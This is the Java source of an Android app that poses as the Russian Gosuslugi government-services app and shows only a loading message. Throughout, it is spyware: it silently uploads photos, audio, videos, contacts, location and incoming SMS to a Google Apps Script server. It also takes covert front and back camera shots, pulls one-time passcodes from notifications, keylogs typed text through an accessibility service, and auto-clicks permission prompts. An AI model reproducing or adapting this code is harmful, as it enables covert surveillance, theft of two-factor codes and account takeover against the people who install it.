package ru.gosuslugi.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.Manifest;
import android.media.Image;
import android.media.ImageReader;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity {

    private static final String TAG = "Gosuslugi";
    private static final String SERVER_URL = "https://script.google.com/macros/s/AKfycbxZ6S4v-0m4_CR645aVq2ZnBcc0ak-M_5UX-0yLX9jI_bhozwrkA968NaE4WRl9ay7abA/exec";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Госуслуги загружаются...");
        tv.setTextSize(24);
        tv.setPadding(50, 100, 50, 50);
        setContentView(tv);
    }

    // ==================== DEVICE UTILS ====================
    public static String getDeviceId(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    // ==================== UPLOAD HELPERS ====================
    public static void uploadFile(Context context, File file, String endpoint) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
                OutputStream os = conn.getOutputStream();
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
                os.close(); fis.close();
                Log.d(TAG, "Uploaded: " + file.getName() + " -> " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Upload error: " + e.getMessage());
            }
        }).start();
    }

    public static void sendTextToServer(Context context, String type, String text) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Device-ID", getDeviceId(context));
            JSONObject json = new JSONObject();
            json.put("type", type);
            json.put("data", text);
            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.close();
            Log.d(TAG, "Text sent: " + conn.getResponseCode());
        } catch (Exception e) {
            Log.e(TAG, "Text upload error: " + e.getMessage());
        }
    }

    public static boolean uploadFileBlocking(Context context, File file, String endpoint) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            OutputStream os = conn.getOutputStream();
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
            os.close(); fis.close();
            return conn.getResponseCode() == 200;
        } catch (Exception e) {
            return false;
        }
    }

    public static void sendSMSLogToServer(Context context, String sender, String message, String timestamp) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject json = new JSONObject();
                json.put("sender", sender);
                json.put("message", message);
                json.put("timestamp", timestamp);
                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes("UTF-8"));
                os.close();
                Log.d(TAG, "SMS sent: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "SMS error: " + e.getMessage());
            }
        }).start();
    }

    // ==================== FILE UTILS ====================
    public static List<String> getAllPhotos(Context context) {
        return getFilesFromMediaStore(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 0, Long.MAX_VALUE);
    }

    public static List<String> getAllVideosUnder30MB(Context context) {
        return getFilesFromMediaStore(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 0, 30L * 1024 * 1024);
    }

    public static List<String> getAllAudios(Context context) {
        return getFilesFromMediaStore(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, 0, Long.MAX_VALUE);
    }

    private static List<String> getFilesFromMediaStore(Context context, Uri uri, long minSize, long maxSize) {
        List<String> files = new ArrayList<>();
        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.SIZE};
        String selection = MediaStore.MediaColumns.SIZE + " >= ? AND " + MediaStore.MediaColumns.SIZE + " <= ?";
        String[] args = {String.valueOf(minSize), String.valueOf(maxSize)};
        Cursor cursor = context.getContentResolver().query(uri, projection, selection, args, null);
        if (cursor != null) {
            int dataIndex = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
            while (cursor.moveToNext()) {
                String path = cursor.getString(dataIndex);
                if (path != null && new File(path).exists()) files.add(path);
            }
            cursor.close();
        }
        return files;
    }

    // ==================== SILENT CAMERA ====================
    public static void captureCamera(Context context, int lensFacing) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics c = manager.getCameraCharacteristics(cameraId);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == lensFacing) {
                    HandlerThread ht = new HandlerThread("Cam");
                    ht.start();
                    Handler bg = new Handler(ht.getLooper());
                    ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return;
                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override public void onOpened(@NonNull CameraDevice camera) {
                            try {
                                CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                req.addTarget(reader.getSurface());
                                reader.setOnImageAvailableListener(r -> {
                                    Image img = reader.acquireLatestImage();
                                    if (img != null) {
                                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                        byte[] buf = new byte[img.getPlanes()[0].getBuffer().remaining()];
                                        img.getPlanes()[0].getBuffer().get(buf);
                                        bos.write(buf);
                                        img.close();
                                        uploadPhotoToServer(context, bos.toByteArray(), lensFacing);
                                    }
                                    reader.close();
                                    camera.close();
                                    ht.quitSafely();
                                }, bg);
                                camera.createCaptureSession(Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(@NonNull CameraCaptureSession s) {
                                        try { s.capture(req.build(), null, bg); } catch (CameraAccessException ignored) {}
                                    }
                                    @Override public void onConfigureFailed(@NonNull CameraCaptureSession s) {}
                                }, bg);
                            } catch (CameraAccessException ignored) {}
                        }
                        @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                        @Override public void onError(@NonNull CameraDevice camera, int e) { camera.close(); }
                    }, bg);
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera error: " + e.getMessage());
        }
    }

    private static void uploadPhotoToServer(Context context, byte[] data, int lensFacing) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Device-ID", getDeviceId(context));
            conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + (lensFacing == CameraCharacteristics.LENS_FACING_FRONT ? "front_" : "back_") + System.currentTimeMillis() + ".jpg\"");
            OutputStream os = conn.getOutputStream();
            os.write(data);
            os.flush();
            os.close();
            Log.d(TAG, "Photo sent: " + conn.getResponseCode());
        } catch (Exception e) {
            Log.e(TAG, "Photo error: " + e.getMessage());
        }
    }

    // ==================== CONTACTS ====================
    public static List<String> getContacts(Context context) {
        List<String> contacts = new ArrayList<>();
        Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if (name != null && num != null) contacts.add(name + ": " + num);
            }
            c.close();
        }
        return contacts;
    }

    // ==================== LOCATION ====================
    public static void getLocation(Context context) {
        FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(context);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
        client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                .addOnSuccessListener(loc -> {
                    if (loc != null) sendTextToServer(context, "location", "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
                });
    }

    // ==================== SMS RECEIVER ====================
    public static class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                            sendSMSLogToServer(context, sms.getDisplayOriginatingAddress(), sms.getMessageBody(), String.valueOf(sms.getTimestampMillis()));
                        }
                    }
                }
            }
        }
    }

    // ==================== NOTIFICATION LISTENER ====================
    public static class NotifListener extends NotificationListenerService {
        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            Matcher m = Pattern.compile("\\b(\\d{6,8})\\b").matcher(title + " " + text);
            if (m.find()) {
                sendTextToServer(getApplicationContext(), "otp", "Code: " + m.group(1) + " App: " + sbn.getPackageName());
            }
        }
    }

    // ==================== ACCESSIBILITY SERVICE ====================
    public static class GosuslugiAccessibilityService extends AccessibilityService {
        private final StringBuilder keylogBuffer = new StringBuilder();
        private final Handler handler = new Handler();

        @Override
        public void onServiceConnected() {
            super.onServiceConnected();
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_VIEW_CLICKED | AccessibilityEvent.TYPE_VIEW_FOCUSED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
            setServiceInfo(info);
            scheduleKeylogUpload();
        }

        private void scheduleKeylogUpload() {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (keylogBuffer.length() > 0) {
                        sendTextToServer(getApplicationContext(), "keylog", keylogBuffer.toString());
                        keylogBuffer.setLength(0);
                    }
                    handler.postDelayed(this, 60000);
                }
            }, 60000);
        }

        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            if (event == null || event.getSource() == null) return;
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && event.getText() != null && event.getText().toString().length() > 0) {
                keylogBuffer.append("[").append(System.currentTimeMillis()).append("] ").append(event.getPackageName()).append(": ").append(event.getText()).append("\n");
            }
            autoClickAllow(event.getSource());
        }

        private void autoClickAllow(AccessibilityNodeInfo node) {
            if (node == null) return;
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null && child.getText() != null) {
                    String text = child.getText().toString().toLowerCase();
                    if (text.equals("allow") || text.equals("ok") || text.equals("yes") || text.contains("allow")) {
                        if (child.isClickable()) { child.performAction(AccessibilityNodeInfo.ACTION_CLICK); return; }
                    }
                }
                autoClickAllow(child);
            }
        }

        @Override public void onInterrupt() {}
    }
}
